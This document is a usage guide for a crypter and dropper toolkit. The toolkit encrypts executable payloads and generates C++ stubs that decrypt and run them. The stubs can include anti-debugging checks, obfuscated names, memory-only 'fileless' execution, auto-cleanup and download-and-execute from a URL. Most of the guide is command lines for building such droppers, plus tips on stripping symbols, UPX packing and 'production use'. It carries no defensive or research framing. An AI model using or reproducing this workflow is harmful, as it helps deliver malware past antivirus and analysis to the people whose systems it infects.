# Complete Usage Guide for Encryption Tools & Stub Generators

## Overview

This project contains multiple tools for encrypting payloads and generating stubs that can decrypt and execute them. Here's how to use each tool:

## 1. Basic Workflow

### Step 1: Compile the Tools

```bash
# Compile the main tools
g++ -O2 -o universal_encryptor universal_encryptor.cpp
g++ -O2 -o unified_stub_generator unified_stub_generator.cpp
g++ -O2 -o native_stub_generator native_stub_generator.cpp
g++ -O2 -o stub_linker stub_linker.cpp
g++ -O2 -o enhanced_stub_linker enhanced_stub_linker.cpp
```

### Step 2: Basic Encryption and Stub Generation

#### Method 1: Using Universal Encryptor + Stub Linker

```bash
# 1. Encrypt your payload
./universal_encryptor payload.exe encrypted.bin

# 2. Generate a standalone stub
./native_stub_generator --standalone stub.cpp basic

# 3. Link the encrypted payload with the stub
./stub_linker stub.cpp encrypted.bin final_dropper.cpp

# 4. Compile the final dropper
g++ -O2 -o final_dropper final_dropper.cpp
```

#### Method 2: Using Unified Stub Generator (All-in-One)

```bash
# Generate stub with embedded payload in one step
./unified_stub_generator payload.exe output_stub.cpp --config

# Follow the interactive prompts to configure:
# - Encryption type (AES/ChaCha20/XOR)
# - Anti-debugging features
# - Execution method
# - Output format
```

## 2. Advanced Features

### Stealth Stub Generation

```bash
# Generate ultimate stealth stub
./ultimate_stealth_generator payload.exe stealth_stub.cpp

# The stealth stub includes:
# - Obfuscated function names
# - Anti-debugging checks
# - Memory-only execution
# - Auto-cleanup
```

### URL-Based Payload (Download & Execute)

```bash
# Generate a stub that downloads payload from URL
./unified_stub_generator --url url_stub.cpp --config

# When prompted, enter:
# - URL: https://example.com/payload.exe
# - Configure other options as needed
```

### Fileless Execution

```bash
# Generate fileless stub (memory-only execution)
./unified_stub_generator payload.exe fileless_stub.cpp --config

# Select option 2 (Fileless mode) when prompted
```

## 3. Tool-Specific Usage

### Universal Encryptor

```bash
# Basic encryption
./universal_encryptor input.exe output.enc

# Encrypt with specific algorithm
./universal_encryptor -aes input.exe output.enc     # AES-128-CTR
./universal_encryptor -chacha input.exe output.enc  # ChaCha20
./universal_encryptor -xor input.exe output.enc     # XOR encryption

# Decrypt a file
./universal_encryptor -d encrypted.bin decrypted.exe
```

### Native Stub Generator

```bash
# Generate different stub types
./native_stub_generator payload.exe stub.cpp basic      # Basic stub
./native_stub_generator payload.exe stub.cpp advanced   # Anti-debug features
./native_stub_generator payload.exe stub.cpp stealth    # Maximum stealth

# Standalone stubs (no embedded payload)
./native_stub_generator --standalone stub.cpp basic
./native_stub_generator --standalone stub.cpp advanced
./native_stub_generator --standalone stub.cpp stealth
```

### Enhanced Stub Linker

```bash
# Link with automatic key extraction
./enhanced_stub_linker stub.cpp encrypted_payload.bin final.cpp

# Verify stub keys
./enhanced_stub_linker -verify stub.cpp
```

## 4. Compilation Options

### Windows
```bash
# MinGW
g++ -O2 -o stub.exe stub.cpp -lwininet -static

# Visual Studio Command Prompt
cl /O2 /MT stub.cpp wininet.lib
```

### Linux
```bash
# Standard compilation
g++ -O2 -o stub stub.cpp -pthread

# With all optimizations
g++ -O3 -s -o stub stub.cpp -pthread -fno-exceptions -fno-rtti
```

## 5. Examples

### Example 1: Basic Payload Encryption
```bash
# Encrypt calc.exe and create dropper
./universal_encryptor calc.exe calc_encrypted.bin
./native_stub_generator --standalone basic_stub.cpp basic
./stub_linker basic_stub.cpp calc_encrypted.bin calc_dropper.cpp
g++ -O2 -o calc_dropper calc_dropper.cpp
```

### Example 2: Stealth Dropper with Anti-Debug
```bash
# One-step generation with unified generator
./unified_stub_generator notepad.exe stealth_notepad.cpp --config
# Select: 1 (embedded), AES encryption, enable all anti-features
g++ -O2 -o stealth_notepad stealth_notepad.cpp
```

### Example 3: URL Downloader
```bash
# Create stub that downloads and executes from URL
./unified_stub_generator --url downloader.cpp --config
# Enter URL when prompted
g++ -O2 -o downloader downloader.cpp -lwininet  # Windows
g++ -O2 -o downloader downloader.cpp             # Linux
```

## 6. Output Files

Each tool generates different output:

- **universal_encryptor**: Creates `.enc` file + `.keys` file
- **native_stub_generator**: Creates `.cpp` source file
- **unified_stub_generator**: Creates complete `.cpp` stub
- **stub_linker**: Creates final `.cpp` with embedded payload

## 7. Tips & Best Practices

1. **Always test in isolated environment first**
2. **Use different encryption keys for each build**
3. **Enable anti-debugging for production use**
4. **Strip symbols from final binary**: `strip -s output`
5. **Use UPX for additional packing**: `upx --best output`

## 8. Troubleshooting

### "undefined reference" errors
- Add required libraries: `-lwininet` (Windows), `-pthread` (Linux)

### "file not found" errors
- Ensure all paths are correct
- Check file permissions

### Compilation warnings
- Use `-w` flag to suppress warnings
- Or fix individually based on compiler output

## 9. Quick Reference

```bash
# Encrypt
./universal_encryptor input output

# Generate stub
./native_stub_generator [--standalone] input output.cpp [type]

# Link
./stub_linker stub.cpp payload.enc final.cpp

# Compile
g++ -O2 -o final final.cpp [-lwininet] [-pthread]

# Execute
./final
```